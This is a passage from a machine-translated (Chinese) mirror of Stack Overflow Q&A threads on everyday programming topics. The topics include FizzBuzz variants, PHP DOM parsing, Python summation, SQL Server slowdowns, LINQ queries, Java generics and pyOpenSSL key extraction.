​我使用三元运算符返回一个空字符串或`'ping'/'pong'`，连接这些运算符的结果，然后执行 OR（如果数字不能被 3 或 5 整除，则连接的结果是`''`javascript 中的 FALSEY） . 当两种情况都为真时，连接的结果是`'pingpong'`。

所以基本上它归结为

```
'' || x         // returns x
'ping' || x     // returns 'ping'
'pong' || x     // returns 'pong'
'pingpong' || x // returns 'pingpong' 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2018-08-13T04:20:20.230

我想出的最好的解决方案是这个：

```
for (var i = 1; i <= 100; i++) {
  var message = '';
  if (i%3 === 0) message += 'ping';
  if (i%5 === 0) message += 'pong';
  console.log(message || i);
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-02-11T12:46:11.893

这是一个解决方案，它允许在不添加更多条件的情况下使用动态的倍数列表。

```
// List of outputs
var outputs = [
    {mult: 3, str: 'ping'},
    {mult: 5, str: 'pong'}
    // {mult: 10, str: 'play'} ex: [30] => 'pingpongplay'
];

// Loop 100 times
for (var i = 1, j = 100; i <= j; i += 1) {

    // Set empty vars
    var result, string = '';

    // Loop through the listed output objects
    outputs.forEach(function (output) {

        // If listed multiple, concat string
        if (i % output.mult === 0) {
            string += output.str;
        }

    });

    // Set result
    if (string.length) {
        result = string;
    } else {
        result = i;
    }

    // print result
    document.body.innerHTML += result + '<br>';
} 
```

作为通过 jslint 的函数：

```
/*jslint browser: true */
var printOutputs = function (array, iterations) {
    'use strict';
    var i = 1;
    var outputResults = function (arr, idx) {
        var result;
        var str = '';
        arr.forEach(function (item) {
            if (idx % item.mult === 0) {
                str += item.str;
            }
        });
        if (str.length) {
            result = str;
        } else {
            result = idx;
        }
        return result;
    };
    while (i < iterations) {
        document.body.innerHTML += outputResults(array, i) + '<br>';
        i += 1;
    }
};
var outputs = [
    {mult: 3, str: 'ping'},
    {mult: 5, str: 'pong'}
];
printOutputs(outputs, 100); 
```

为了好玩，一个缩小的 ES6 版本：

```
const pO=(arr,itr)=>{let i=1,o=(a,idx)=>{let r,s='';a.map(v=>{if(idx%v.mult===0)s+=v.str});s.length?r=s:r=idx;return r};while(i<itr){document.body.innerHTML+=`${o(arr,i)}<br>`;i++}};
pO([{mult:3,str:'ping'},{mult:5,str:'pong'}], 100); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-02T22:58:44.517

我为此写了一些变体（使用`fizz`and `buzz`）作为基准来考虑迭代条件逻辑的不同方法。

`while`又赢了：

```
// Iterate using a recursive function
// firing a callback once per iteration

function f(s,n) {
    if(++n >= 102) return;
    s === '' ? console.log(n-1) : console.log(s);
    !!(n % 3)
        ? !!(n % 5)
            ? f('',n) : f('Buzz',n)
        : !!(n % 5)
            ? f('Fizz',n) : f('FizzBuzz',n);
}

// Iterate using a `while` loop
// firing a callback after satisfying a condition

function b(n) {
    var i = n;
    $:
        while(++i) {
            if(i % 3)
                if(i % 5) 
                    console.log(i);
                else 
                    console.log('Buzz');
            else if(i % 5) 
                console.log('Fizz');
            else 
                console.log('FizzBuzz');
            if(i >= 100) 
                break $;
        }
    return;
}

// Iterate using a `for` loop
// firing a callback once per iteration

function F(n) {
    var i = n, f = 'Fizz', b = 'Buzz', o = '';
    for (; i <= 100; i++) { 
        o = !(i % 3) 
            ? !(i % 5) 
                ? f + b : f 
            : !(i % 5) 
                ? b : i; 
        console.log(o);
    }
    return;
}

// Iterate using a `for` loop
// firing a callback after satisfying a condition

function B(n) {
    var i = n;
    var fiz = 'Fizz';
    var buz = 'Buzz';
    for(; i <= 100; i++)
        if(!(i % 3))
            if(!(i % 5))
                console.log(fiz + buz);
            else
                console.log(fiz);
        else if(!(i % 5))
            console.log(buz);
        else
            console.log(i);
    return;     
}

f('', 1); // recursive
b(0);     // `while`
F(1);     // `for`
B(1);     // `for 
```

**基准测试：http: [//jsperf.com/fizzbuzz-mod](http://jsperf.com/fizzbuzz-mod)**

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-06-08T11:51:14.020

```
//create a for loop to count from 0 to 100
       for (let num = 0; num <= 100; num++){
        /**As the count increments, if the number is divisible by 3 and divisible by 5
        print FizzBuzz, I have concatenated the number with FizzBuzz for clarity. 
        Use % instead of \ to ensure it returns an int instead of float.**/
         if ((0 == num % 3) && (0 == num % 5)){
           console.log ("FizzBuzz" + " " + num); 
//otherwise, if the number is divisible by 5 print Buzz
         } else if (0 == num % 5) {
          console.log("Buzz" + " " + num);
//Also, if the number is divisible by 3 print Fizz
         } else if (0 == num % 3){
           console.log("fizz" + " " + num);
         } else {
//meanwhile, still print all the numbers that don't satisfy the conditions above
           console.log (num);
         }
      }
```

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2014-04-01T18:52:31.923

```
 for( int number = 1 ; number < 100 ; number++ )
    {
        boolean shouldPrintNumber = true;

        System.out.println("\n");
        if( (number%3) == 0 )
        {
            System.out.print("ping");
            shouldPrintNumber = false;
        }
        if( (number%5) == 0 )
        {
            System.out.print("pong");
            shouldPrintNumber = false;
        }

        if( shouldPrintNumber )
        {
            System.out.print( number );
        }

    } 
```

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2015-03-06T05:23:16.843

```
for var a = 1; a <= 100 ; a++
{
  if a % 3 == 0 && a % 5 == 0
  {
    println("Fizzbuzz")
    continue
  }
  if a % 5 == 0
  {
    println("Buzz")
    continue
  }
  if a % 3 == 0
  {
    println("Fizz")
    continue
  }
  else
  {
    println(a)
  }
} 
```

* * *

## 回答 #9

> 赞同：-2
> 
> 时间：2013-03-02T23:11:51.797

要摆脱最后一个条件，您可能会使用`continue`：

```
for (x=1; x <= 100; x++){

    if( x % 3 == 0 ){
        write("ping")
        continue
    }
    if( x % 5 == 0 ){
        write("pong")
        continue
    }

    write(x)
} 
```

# php - 如何使用嵌入的 PHP 代码解析 HTML？

> ID：13845443
> 
> 赞同：0
> 
> 时间：2012-12-12T17:37:40.450
> 
> 标签：php, dom

我正在做一些 HTML DOM 操作：

```
function parse_html($html) {
    $dom->loadHTML($html);
    libxml_clear_errors();

    // Parse DOM 

    return $dom->saveHTML();
} 
```

问题是我的 HTML 包含一些 PHP 代码，其中一些被转换为 HTML 实体。例如，如果`$html`包含以下内容：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<?php // lang=es
    $pwd = $parameter['pwd'];
    $url = $parameter['url'];
?>

<p>
    You are now registered. Go to -&gt;
    <a href="<?php echo $url ?>">control panel</a> 
    to change the settings.
</p> 
```

它变成了这样：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<html>
<head><meta http-equiv="content-type" content="text/html; charset=UTF-8"></head>
<body>
<?php // lang=es
    $pwd = $parameter['pwd'];
    $url = $parameter['url'];
?><p> You are now registered. Go to -&gt; <a href="&lt;?php%20echo%20%24url%20?&gt;">control panel</a> to change the settings.
</p>
</body>
</html> 
```

在`<?php echo $url ?>`实体中转换，但我不能使用像 *html_entity_decode* 这样的函数，因为它也会解码一些必须保持实体的实体。

如何解析包含 PHP 代码的 DOM？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T20:40:35.917

我找到的解决方案是创建几个函数来编码/解码 PHP 字符串。

```
function encode_php($html) {
    return preg_replace_callback('#<\?php.*\?>#imsU', '_encode_php', $html);
}

function _encode_php($matches) {
    return 'PHP_ENCRYPTED_CODE_BEGIN'.base64_encode($matches[0]).'PHP_ENCRYPTED_CODE_END';
}

function decode_php($html) {
    return preg_replace_callback('#PHP_ENCRYPTED_CODE_BEGIN(.*)PHP_ENCRYPTED_CODE_END#imsU', '_decode_php', $html);
}

function _decode_php($matches) {
    return base64_decode($matches[1]);
} 
```

选择您确定不会出现在文件中的前缀和后缀非常重要。该解决方案已经过 2500 个 HTML 文件的测试，并且可以正常工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T17:50:39.620

您何时何地以及如何构建`$html`变量？正是在那个地点和时间，您想要解析里面的 php。如果您尝试将其吐出，它将像只是一个字符串一样被吐出并且不会被解析。

为了更清楚，`$html`使用当时包含的 php 构建变量。或者，您可能正在构建模板。在这种情况下，你会做不同的事情。

如果您在使用变量后尝试填写 php 内容`$html`，您可以改为使用[str_replace()](http://php.net/manual/en/function.str-replace.php)或其他类似的函数来达到某种效果。

# javascript - 创建一个基本的可滚动缩略图滑块而不刷新页面

> ID：13845447
> 
> 赞同：3
> 
> 时间：2012-12-12T17:38:07.433
> 
> 标签：javascript, ajax, slider, refresh, reload

相关的 JavaScript 新手在这里寻找一些帮助来使用 JavaScript/AJAX/HTML 创建可滚动的缩略图滑块。

“可滚动缩略图滑块”是指一组嵌入“左”和“右”箭头图像之间的缩略图。单击任一箭头应更改显示的缩略图集，而无需重新加载/刷新页面的其余部分。例如，请参阅此页面：[http ://www.travelzoo.com/local-deals/Boston/Entertainment/34729](http://www.travelzoo.com/local-deals/Boston/Entertainment/34729) ://www.travelzoo.com/local-deals/Boston/Entertainment/34729 。

到目前为止，这是我的代码：

```
<div id="thumbnails">
  <a href="#" onclick="slideLeft()"><img src="left_arrow.jpg"/></a>
  <script>
    //I only want to display 4 thumbnails at a time, but may have many more cached
    for (var i=0;i<4;i++)
    {
       // don't worry about the formula below, it simply manipulates the imgCounter var
      document.write('<a href=""><img src="sampleImage'+(((parseInt(imgCounter)+i-1)%4)+1)+'.jpg"/></a>');
    } 
  </script>
  <a href="#" onclick="slideRight()"><img src="right_arrow.jpg"/></a>
</div>

<script>
  ...

  function slideLeft() {
    //imgCounter is a passed var, updated when either arrow is clicked
    imgCounter = (parseInt(imgCounter)+3)%4;
    if (imgCounter == 0)
      imgCounter = 4;
    }
  ...
</script> 
```

当用户单击左箭头或右箭头时，表示第一张图像的变量 (imgCounter) 会更新。然后，我想用这个更新的变量重新绘制 DIV (id="thumbnails")，同时将页面的其余部分保持原样。

这可以用纯 JavaScript 完成吗？
如果没有，有人可以提供一个基本的 AJAX 示例吗？

如果您觉得这个问题已经被回答（我检查过）或没有得到充分的解释，请不要成为一个混蛋/巨魔，并礼貌地建议我可以提供哪些额外的信息。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T20:56:59.100

好的，所以我自己想通了。正如我所怀疑的那样，我想多了......

我编写了一个辅助函数，为我的 div 生成 innerHTML 代码，如下所示：

```
function generateThumbHTML() {
  var html = '';

  for (var i=0;i<4;i++)
  {
    html += '<a href=""><img src="sampleImage';
    html += '(((parseInt(imgCounter)+i-1)%4)+1)';
    html += '.jpg"/></a>';
  }

  return html;
} 
```

然后，我添加了对我的 slideLeft() 和 slideRight() 函数的调用，将我的 DIV 的 innerHTML 属性设置为新的 HTML 代码：

```
<script>
  ...

  function slideLeft() {
    //imgCounter is a passed var, updated when either arrow is clicked
    imgCounter = (parseInt(imgCounter)+3)%4;
    if (imgCounter == 0)
      imgCounter = 4;

    var container = document.getElementById("thumbnails");
    container.innerHTML = generateThumbHTML();
  }
  ...
</script> 
```

我要回答的唯一剩下的问题是……

为什么更新 innerHTML 属性会自动启动？更新此属性后，是否会在后台发生事件？如果是这样，我怎样才能找出正在触发的事件？我正在查看 HTML DOM 规范，但没有在任何对象定义上找到 innerHTML 属性。

# python - 在 Python 中求和？

> ID：13845448
> 
> 赞同：2
> 
> 时间：2012-12-12T17:38:09.857
> 
> 标签：python

例如，假设我想对 x=1 的所有 x^2（或任何其他任意函数）求和，直到 x^2 大于 n。这可以在不使用一堆 while 循环和 if-checks 的情况下完成吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T17:41:23.317

itertools 模块为可扩展的解决方案提供了一些不错的功能：

```
from itertools import takewhile, count

def sum_func(func, n):
    return sum(takewhile(lambda x: x < n, (func(i) for i in count(1)))) 
```

例如：

```
>>> sum_func(lambda x: x**2, 20)  # 1^2 + 2^2 + 3^2 + 4^2
30 
```

如果你想让它也适用于递减函数，你也可以传入测试函数：

```
def sum_func(func, pred):
    return sum(takewhile(pred, (func(i) for i in count(1)))) 
```

例子：

```
>>> sum_func(lambda x: -x*2, lambda x: x > -10)  # -1*2 + -2*2 + -3*2 + -4*2
-20 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-12T17:41:23.587

绝对地。

```
>>> sum(x ** 2 for x in itertools.takewhile(lambda x: x ** 2 <= 100, itertools.count(1)))
385 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T17:40:19.580

你不只是需要做...

```
max_val = 144   
sum(x**2 for x in range(sqrt(max_val))) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T17:41:13.483

`x`每次加1 ？

如果是这样，这将简化为以下公式：`x(x+1)(2x+1)/6`，因为它[是整数的平方和](http://www.ugrad.math.ubc.ca/coursedoc/math101/notes/integration/sums.html)。

所以你真的想避免循环，你可以`x(x+1)(2x+1)/6 < n`直接解决

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-12T17:43:06.703

> 对所有 x^2 求和，
> 直到 x^2 大于 n

```
sum = 0
x = 1
while x**2 <= n:
    sum += x**2
    x += 1 
```

一个`while`循环，没有`if`s。

如果您更愿意使用`for`循环：

```
import itertools

sum = 0
for x in itertools.count(1): # Generates an infinite series: 1, 2, 3, ...
    square = x**2
    if square > n:
        break
    sum += square 
```

一圈`for`，一圈`if`。几乎没有“一堆”。

# jquery - jquery 事件对象中是否有类似“originalScope”属性的东西？

> ID：13845450
> 
> 赞同：0
> 
> 时间：2012-12-12T17:38:12.300
> 
> 标签：jquery, events, scope, event-listener

事件对象中的“originalScrop”属性将非常有用。还是有其他解决方案？

```
{
    show: function(){
        $(document).on('keydown',this.keydownListener);
    },
    keydownListener: function(e){
        if(e.which===27){ o.originalScope.hide(); } // <----- originalScope
    },
    hide: function(){
        $(document).off('keydown',this.keydownListener);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:49:25.567

如果您想`this`在事件处理程序中指向您的对象，请在设置它们时使用[**$.proxy ：**](http://api.jquery.com/jQuery.proxy/)

```
$(document).on('keydown', $.proxy(this.keydownListener, this)); 
```

...它的工作本质上与[Function.prototype.bind](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function/bind)相同：为给定的函数和对象创建另一个函数，其`this`值绑定到特定的对象。

# sql - 如何调查为什么每天运行 2 分钟的 sql 脚本需要 2 小时？

> ID：13845451
> 
> 赞同：0
> 
> 时间：2012-12-12T17:38:25.663
> 
> 标签：sql, sql-server, performance, sql-server-profiler

今天同事问了我一个问题

> “我有一个包含 4 个选择查询的 SQL 脚本。我每天都在使用它一个多月，但昨天相同的查询花了 2 个小时，我不得不中止执行。”

他的问题是

*   Q1。那天这个剧本怎么了？
*   Q2。我如何检查这 4 个查询，其中哪些被执行，哪些是中止的罪魁祸首？

我对 Q2 的回答是使用 SQL 分析器并检查 Sql 语句事件的跟踪。

Q1：我问了他几个问题

1.  那天的数据量是多少？ **他的回答：没有变化**
2.  索引是否有任何变化，即有人可能放弃了索引？**他的回答：没有变化**
3.  它是否通过检查数据管理视图来跟踪它而陷入死锁？**他的回答：没有陷入僵局**

你认为我还应该考虑问什么？这还有其他原因吗？

由于我没有看到查询，所以我无法将其粘贴到此处。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:53:27.890

要看的东西（SQL Server）：

1.  统计数据过时了？有人运行大型批量插入操作吗？运行`update statistics`。

2.  索引的变化？如果是这样，如果它是一个存储过程，请检查执行计划和/或重新编译它......然后再次检查执行计划并更正任何问题。

3.  SQL Server 缓存执行计划。如果您的查询是参数化的或使用 if-then-else 逻辑，第一次运行时，如果参数是边缘情况，则缓存的执行计划对于普通执行可能效果不佳。你可以阅读更多关于这个......啊......功能：

    *   [http://www.solidq.com/sqj/Pages/2011-April-Issue/Parameter-Sniffing-Problem-with-SQL-Server-Stored-Procedures.aspx](http://www.solidq.com/sqj/Pages/2011-April-Issue/Parameter-Sniffing-Problem-with-SQL-Server-Stored-Procedures.aspx)

    *   [http://social.msdn.microsoft.com/Forums/en-US/transactsql/thread/88ff51a4-bfea-404c-a828-d50d25fa0f59](http://social.msdn.microsoft.com/Forums/en-US/transactsql/thread/88ff51a4-bfea-404c-a828-d50d25fa0f59)

    *   [SQL差的存储过程执行计划性能——参数嗅探](https://stackoverflow.com/questions/1007397/sql-poor-stored-procedure-execution-plan-performance-parameter-sniffing)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-07-13T09:22:11.790

在这种情况下，我的方法是：

1.  在这种情况下，他不得不中止执行，因为查询花费的时间超过了预期，最后没有完成。根据我的理解，您正在查询的表可能存在任何阻塞会话/未提交的事务（当天由任何不同的用户执行）。由于您正在执行“select”语句，并且据我所知，“select”语句用于等待任何其他事务完成（如果事务在“select”之前执行）。您的查询可能正在等待任何其他事务完成（事务可能具有更新/插入或删除）。检查阻塞会话（如果有）。

2.  对于单个会话 sql server 在线程之间切换。您需要检查包含查询的线程是否处于“暂停”/“运行”或“可运行”模式。在您的情况下，您的查询可能处于暂停模式。调查查询的模式以及原因。

3.  接下来是碎片化。最佳实践是在您的环境中配置索引重建/重组作业，这有助于消除不必要的碎片。这样您的查询在返回数据时将需要扫描更少的页面。否则，您的查询将花费越来越多的时间来返回数据。配置作业并每周至少执行一次作业。它将不断刷新您的索引和页面。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-12T17:52:59.517

*   [使用 EXPLAIN](http://dev.mysql.com/doc/refman/5.5/en/using-explain.html)分析这四个查询。这将告诉您优化器将如何使用索引（或不使用索引）。

*   将查询添加到脚本`SELECT NOW()`之间的语句之间，以便您可以测量每个查询花费了多长时间。您还可以让 MySQL 为您做算术，方法是将 NOW() 存储到会话变量中，然后使用[TIMEDIFF()](http://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_timediff)来计算语句开始和结束之间的差异。

    ```
    SELECT NOW() INTO @start;
    SELECT SLEEP(5); -- or whatever query you need to measure
    SELECT TIMEDIFF(@start, NOW()); 
    ```

*   @Scott 在他的评论中建议，使用[慢查询日志](http://dev.mysql.com/doc/refman/5.5/en/slow-query-log.html)来测量长时间运行的查询的时间。

*   一旦您确定了长时间运行的查询，请在执行查询时使用查询[PROFILER](http://dev.mysql.com/doc/refman/5.5/en/show-profile.html)来准确查看它在哪里花费时间。

# kendo-ui - 当绑定值更改时，kendo ui 网格会丢失选择

> ID：13845452
> 
> 赞同：1
> 
> 时间：2012-12-12T17:38:31.183
> 
> 标签：kendo-ui

当列绑定的值发生更改时，网格小部件似乎失去了选择。有谁知道如何不失去选择？此处示例（选择一行然后单击“单击此处”）：http: [//jsbin.com/oyuher/1/edit](http://jsbin.com/oyuher/1/edit)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T20:37:39.323

是的，网格已刷新，任何选择都将丢失。在[此代码](http://www.kendoui.com/code-library/web/grid/preserve-grid-state-in-a-cookie.aspx)库中，您可以了解如何保持选择。

基本上有一个 cookie 被使用，但由于您不重新加载页面，您可以简单地将其保存到 JavaScript 变量中。

# javascript - 主干视图不隐藏父视图的事件

> ID：13845454
> 
> 赞同：2
> 
> 时间：2012-12-12T17:38:41.527
> 
> 标签：javascript, jquery, backbone.js

我的主干应用程序显示了一个项目网格，当单击其中一个项目时，将“详细信息”主干视图添加到 DOM（就在网格“div”之后）。

“详细信息”视图使用“阴影”隐藏所有内容，使用 css 转换转换父网格视图，并在其中的 div 中显示详细信息。

我用 css 类隐藏所有内容，如下所示：

```
.itemDetails {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, .5);
    padding-top: 140px;
} 
```

我认为我写的结果被称为“灯箱”。它工作得很好，但问题是，我仍然可以点击阴影后面的一些网格项目（主要是网格后面的那些）。我应该使用“this.undelegateEvents();” ? 还有什么我没有想到的吗？

**基本上，我只想“冻结”（因此悬停效果也不起作用）父视图（直到单击“x” - 这已经有效）。**谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T02:06:14.933

我认为您想到的是模态窗口。链接：[http](http://raventools.com/blog/create-a-modal-dialog-using-css-and-javascript/) ://raventools.com/blog/create-a-modal-dialog-using-css-and-javascript/ 和[如何制作一个简单的模态窗口？](https://stackoverflow.com/questions/6335002/how-to-make-a-simple-modal-window).

简而言之，模态窗口是您所描述但未命名的窗口 - 一个从视图中遮挡所有父级的子窗口，必须先解决该问题，然后才能再次与父级交互。

我可能弄错了，但如果我是对的，模态窗口解决方案比其他一些选项要简单得多。

# linq - Linq 子选择过滤器

> ID：13845461
> 
> 赞同：0
> 
> 时间：2012-12-12T17:38:54.353
> 
> 标签：linq, linq-to-sql, subquery

可能有人可以帮助我解决这个（至少对我而言）复杂的问题。

可以说我有以下数据（在数据库中）

```
Tab1 (id_t1): Item
  (1)
  (2)
  (3)

Tab2 (id_t2, id_t1): Group
  (4, 1)
  (5, 1)
  (6, 2)
  (7, 3)

Tab3 (id_t3, id_t2, v): GroupField
  (10, 4, 100) 
  (11, 4, 300)
  (12, 5, 200)
  (13, 6, 100)
  (14, 6, 200)  
  (15, 7, 100)
  (16, 7, 300) 
```

现在我想选择包含所有某些特定 GroupFields 的所有项目。

例如。我有 v = list(100,200)

我喜欢找回 1,2 但不是 3

1 因为 Group4 持有 Field10 且 v=100 而 Group5 持有 Field12 且 v=200

和 2 因为 Group6 拥有 Field13 的 v=100 和 Field14 的 v=200

在 Linq 中是否有可能发生这样的事情？（我已经尝试过不同的方式（任何/全部），但到目前为止没有成功。

我不明白如何克服“字段可以在任何组中，而不是全部在一个组中”...

我什至不知道如何在不使用临时表/游标的情况下在一个命令中在 SQL 中执行此操作。

_rene

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T18:12:59.887

试试这个：

```
var result =
    groups.Join(fields, o => o.Id, i => i.GroupId,
                (o, i) => new { Group = o, Field = i } )
          .GroupBy(x => x.Group.ItemId)
          .Where(x => values.All(y => x.Any(z => z.Field.Value == y)))
          .Select(x => x.Key)
          .Distinct(); 
```

使用以下类：

```
class Group
{
    public Group(int id, int itemId)
    {
        Id = id;
        ItemId = itemId;
    }

    public int Id { get; set; }
    public int ItemId { get; set; }
}

class GroupField
{
    public GroupField(int id, int groupId, int value)
    {
        Id = id;
        GroupId = groupId;
        Value = value;
    }

    public int Id { get; set; }
    public int GroupId { get; set; }
    public int Value { get; set; }
} 
```

和以下初始化：

```
var groups = new [] { new Group(4, 1), new Group(5, 1),
                      new Group(6, 2), new Group(7, 3) };

var fields = new [] { new GroupField(10, 4, 100),
                      new GroupField(11, 4, 300), 
                      new GroupField(12, 5, 200),  
                      new GroupField(13, 6, 100),  
                      new GroupField(14, 6, 200),  
                      new GroupField(15, 7, 100),  
                      new GroupField(16, 7, 300)
                    };

var values = new [] { 100, 200 }; 
```

# javascript - javascript在某个点遍历数组

> ID：13845462
> 
> 赞同：2
> 
> 时间：2012-12-12T17:38:57.550
> 
> 标签：javascript, jquery, html

我正在尝试遍历播放列表，但在当前歌曲播放完毕或选择播放列表中的新歌曲之前不会跳到下一个项目。目前我的数组是迭代的，但不等待当前歌曲完成播放。

HTML：

```
<li mp3="song1.mp3"></li>
<li mp3="song2.mp3"></li>
<li mp3="song3.mp3"></li>
<li mp3="song4.mp3"></li> 
```

JavaScript：

```
var player = new MediaElementPlayer('audio');

playlist = ['song1.mp3', 'song2.mp3', 'song3.mp3', 'song4.mp3'];

$('li').click(function() {
  for (var i = playlist.indexOf($(this).attr('mp3')); i < playlist.length; i++) {
    player.setSrc(playlist[i]);
    player.play();
    player.addEventListener('ended', function(e) {
      player.setSrc(playlist[i]);
      player.play();
    }, false);
  }
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T17:43:23.523

你正在运行一个普通的循环，所以一堆`.play()`调用一个接一个地运行。相反，只运行一个`.play()`，当歌曲结束时调用下一个。这可以通过递归调用来完成。此外，请使用`data-mp3`属性 和`.data("mp3")`，因为这是定义自定义属性的唯一有效方法。

```
$("#playlist li").click(function() {
  var start = playlist.indexOf($(this).data("mp3"));

  (function play(i) {
    if(i < playlist.length) {  // if we're not at the end of the playlist yet
      player.setSrc(playlist[i]);
      player.play();
      player.addEventListener("ended", function(e) {
        play(i + 1);  // done, so call with next index
      }, false);
    }
  })(start);  // call it with first index now
}); 
```

# salesforce - Salesforce 触发外部程序

> ID：13845465
> 
> 赞同：3
> 
> 时间：2012-12-12T17:39:13.923
> 
> 标签：salesforce, apex-code, visualforce

我不能 100% 确定如何描述我想要做的事情的术语，所以我提前道歉。

我在salesforce中有一个对象的自定义入口页面，我很好奇当我单击保存按钮时是否可以调用外部网站。

粗略的例子：

1.  用户输入一个新帐户并点击保存。
2.  保存帐户后，扩展程序类调用将条目插入外部数据库的网页，以让 salesforce 外部的一组不同用户知道已创建新内容。

再次，我道歉。我知道我描述得不是很好。感谢您的任何和所有输入！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T19:45:58.347

对的，这是可能的。查看Apex 代码开发人员指南的[使用 Apex 调用标注](http://www.salesforce.com/us/developer/docs/apexcode/index_Left.htm#StartTopic=Content/apex_callouts.htm)部分。Salesforce 将此（您的 Apex 代码连接到另一个 Web 服务器）称为 HTTP 标注。

此外，请查看[Salesforce.com 专用 StackExchange 站点](https://salesforce.stackexchange.com/)上[带有“标注”标签的问题](https://salesforce.stackexchange.com/questions/tagged/callout)。

# java - 泛型和继承：需要一个复杂的 Map 实例

> ID：13845468
> 
> 赞同：4
> 
> 时间：2012-12-12T17:39:26.957
> 
> 标签：java, generics, inheritance, map

```
public abstract class Mother {
}

public class Daughter extends Mother {
}

public class Son extends Mother {
} 
```

我需要一个`Map`哪些键是一个`Daughter`或多个`Son`类，哪些值分别是这两个类之一的对象**列表**。

例如：

```
/* 1\. */ map.put(Daughter.class, new ArrayList<Daughter>()); // should compile
/* 2\. */ map.put(Son.class, new ArrayList<Son>()); // should compile
/* 3\. */ map.put(Daughter.class, new ArrayList<Son>()); // should not compile
/* 4\. */ map.put(Son.class, new ArrayList<Daughter>()); // should not compile 
```

我试过`Map<Class<T extends Mother>, List<T>>`了，但它没有编译。

`Map<Class<? extends Mother>, List<? extends Mother>>`确实可以编译，但是案例`3.`和`4.`编译也应该不应该。

甚至可能吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-12T17:47:16.720

我认为不可能在类型中对此进行编码，我会使用自定义类来完成

```
class ClassMap<T> {
  private Map<Class<? extends T>, List<? extends T>> backingMap = new HashMap<>();

  public <E extends T> void put(Class<E> cls, List<E> value) {
    backingMap.put(cls, value);
  }

  @SuppressWarnings("unchecked")
  public <E extends T> List<E> get(Class<E> cls) {
    return (List<E>)backingMap.get(cls);
  }
} 
```

只要您不将`backingMap`引用泄漏到此类之外，在此处抑制警告是安全的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T17:46:08.313

假设您正在寻找一张地图，那么这是不可能的。

# java - 使用 RC2 算法解密数据

> ID：13845469
> 
> 赞同：-1
> 
> 时间：2012-12-12T17:39:28.000
> 
> 标签：java, cryptography

我需要实现一个 java 函数，它从用户那里接收密码字符串和字节数据，并使用 RC2 算法对其进行解密。有谁知道如何在 Java 中做到这一点。如果是这样，我应该使用什么类。

谢谢，维斯利

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:49:42.637

实际上，java 确实支持开箱即用的 RC2，所以你应该能够使用[标准的 java crypto support](http://docs.oracle.com/javase/6/docs/technotes/guides/security/crypto/CryptoSpec.html)。

# python - 使用 pyOpenSSL 从证书或其他连接信息中提取公钥

> ID：13845470
> 
> 赞同：3
> 
> 时间：2012-12-12T17:39:29.877
> 
> 标签：python, twisted, public-key, pyopenssl

我目前正在尝试编写一个 python 服务器脚本，该脚本应该根据其公钥对当前客户端进行身份验证。由于我使用的是 twisted，[因此 twisted 文档中的示例](http://twistedmatrix.com/documents/11.0.0/core/howto/ssl.html#auto7)让我开始了。

虽然我可以使用示例代码生成密钥、连接和通信，但我还没有找到以可用格式获取客户端公钥的方法。在[这个 stackexchange 问题](https://stackoverflow.com/questions/10362965/how-to-get-public-key-using-pyopenssl)中，有人从对象中提取公钥，`OpenSSL.crypto.PKey`但无法将其转换为可读格式。由于我可以在方法中或通过我的协议的任何方法访问`PKey`x509 证书的对象，这将是一个不错的方法。（不接受）答案建议尝试. 不幸的是，这并没有真正产生预期的结果：虽然答案中的and可以通过简单的文本替换函数来修复，但 base64 字符串似乎与公钥不匹配。我已经提取了公钥`verifyCallback``self.transport.getPeerCertificate()``crypto.dump_privatekey(PKey)``BEGIN PRIVATE KEY``BEGIN PRIVATE KEY``openssl rsa -in client.key -pubout > client.pub`[正如这里](https://stackoverflow.com/questions/10271197/openssl-how-to-extract-public-key)提到的。`dump_privatekey`它与函数的结果不匹配。

虽然在 launchpad 上仍然存在[针对 OpenSSL 的开放错误](https://bugs.launchpad.net/pyopenssl/+bug/780089)，但尚未修复。这是 19 个月前报道的，最近（2012 年 10 月）有一些活动，我不希望在回购中快速修复。

`client.pub`您是否还有其他想法如何以与我上面提到的文件相当的格式获取公钥？也许有一个扭曲的或 OpenSSL 连接特定的对象来保存此信息。请注意，我必须将公钥存储在协议对象中，以便以后可以访问它。

## 为什么没有答案被接受？

### JF Sebastian 的 M2Crypto

